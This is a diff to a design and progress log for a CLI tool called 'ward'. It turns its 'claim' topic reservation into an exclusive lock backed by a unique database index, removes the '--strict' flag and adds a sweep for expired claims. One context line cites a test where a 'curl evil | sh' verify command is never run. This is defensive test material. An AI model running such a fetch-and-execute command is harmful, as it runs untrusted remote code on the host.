@@ -282,8 +282,9 @@ prove done, in the spirit of chef's `tasks.md`.
 - **Exit criteria:**
   - `ward resume` shows `incomplete` prominently (files/lines/why) and cached
     `verify_status` ✓/✗/⚠ on context artifacts.
-  - Under `full` ceremony, a `claim` on a topic with active overlap is rejected/
-    warned before the contested write; advisory otherwise.
+  - A `claim add` on a topic already held is a hard error (non-zero exit):
+    the unique index on `(claim_topic, project)` is the lock, so two processes
+    can never both hold the same topic.
 - **Depends on:** P2 (handoff/incomplete/claim), P4 (verify flags on resume), P5
   (ceremony_level → claim enforcement). D0.1 (shared-state nodes).
 
@@ -459,12 +460,14 @@ routing/verify logic was not touched.
   put with a `curl evil | sh` verify_cmd is not local and never runs;
   `TestMemoryPutLocalTrust` asserts `--local`/`--by human` do mark local.
   Committed after the model-adapter work (post-v0.2.0, untagged).
-- **`claim` command — CLOSED (2026-08-22).** `ward memory claim add <topic>
-  [--by a] [--ttl m] [--strict]` is an advisory (no-locking) topic reservation
-  with overlap detection (warn, or error under `--strict`); `claim release
-  <topic>` / `claim list` manage active claims. Claims are stored as `kind:claim`
-  artifacts with a TTL; overlap is checked against accepted, non-expired claims.
-  Covered by `TestClaimLifecycle`.
+- **`claim` command — CLOSED (2026-08-22), RECAST as exclusive (lock) in v0.4.x.**
+  `ward memory claim add <topic> [--by a] [--ttl m]` is an EXCLUSIVE reservation:
+  the unique index on `(claim_topic, project)` enforces one active claim per
+  (topic, project); a conflicting `claim add` is a hard error (`error: claim
+  overlap on <topic>`, non-zero exit), never a warning. `claim release <topic>` /
+  `claim list` manage active claims. Claims are stored as `kind:claim` artifacts
+  with a TTL; `ward tick` frees expired claims (clears `claim_topic`) so the topic
+  can be re-claimed. Covered by `TestClaimLifecycle` + `TestSweepExpiredClaims`.
 - **`context` builder — CLOSED (2026-08-22).** `ward memory context <query>`
   prints a compact injection block (ids, kind, summary, tags, verify_status, no
   full content). Covered by `TestContextCompactBlock`.
@@ -510,13 +513,14 @@ non-goals). Spec-first: `.spec/broker.md` written before any code.
   `SetMaxOpenConns(1)` only serialized *within* one process, so two `ward`
   binaries sharing `ward.db` could both win. Now: a `claim_topic` column +
   unique index `uni_claim_topic ON artifacts(claim_topic, project)`. A claim is a
-  single plain `INSERT` (`Store.ClaimTopic`) — on conflict the caller warns or
-  errors (`--strict`); `ReleaseClaim` sets `claim_topic=NULL` to free the slot.
-  `PRAGMA busy_timeout=5000` added so concurrent writers (cross-process) wait
-  instead of getting `SQLITE_BUSY`. Migration is additive (`user_version` 2→3).
-  Tests: `TestClaimTopicAtomicRace` (8 processes, exactly one wins),
-  `TestClaimReleaseAndReclaim`, `TestClaimLifecycle` (rewritten to new semantics:
-  different topics → 2 active; same topic → 1 + warning).
+  single plain `INSERT` (`Store.ClaimTopic`) — on conflict the caller errors
+  (`error: claim overlap on <topic>`, non-zero exit); `ReleaseClaim` and `tick`
+  both set `claim_topic=NULL` to free the slot. `PRAGMA busy_timeout=5000` added
+  so concurrent writers (cross-process) wait instead of getting `SQLITE_BUSY`.
+  Migration is additive (`user_version` 2→3). `--strict` removed: a conflict is
+  always exclusive. Tests: `TestClaimTopicAtomicRace` (8 processes, exactly one
+  wins), `TestClaimReleaseAndReclaim`, `TestClaimLifecycle` (rewritten: different
+  topics → 2 active; same topic → hard error), `TestSweepExpiredClaims`.
 - **`tier:` field is a routing FLOOR (`broker.md` §2).** `Node.Tier`
   (`yaml:"tier"`); `routing.Inputs.DeclaredTier` is applied **last** in `Route`,
   so it can never lower the selected tier — even a memory-hit+verified-cheap case
